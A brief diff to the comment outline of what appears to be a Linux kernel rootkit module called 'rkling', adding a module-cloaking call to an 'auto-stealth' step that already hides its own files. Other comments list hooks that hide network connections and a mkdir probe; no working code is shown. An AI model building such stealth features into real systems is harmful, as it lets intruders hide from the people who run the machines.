@@ -124,7 +124,7 @@ static bool persist_requested;
 // 6. Register tcp4_seq_show kretprobe
 // 7. Register mkdir kprobe
 // 8. Create /proc/rkling_status (0400, read-only)
-// 9. Auto-stealth: rk_target_add(&file_targets, "rkling")
+// 9. Auto-stealth: rk_target_add(&file_targets, "rkling"), rk_module_cloak()
 // Clean up in reverse order on failure
 
 // TODO: Implement rk_exit()
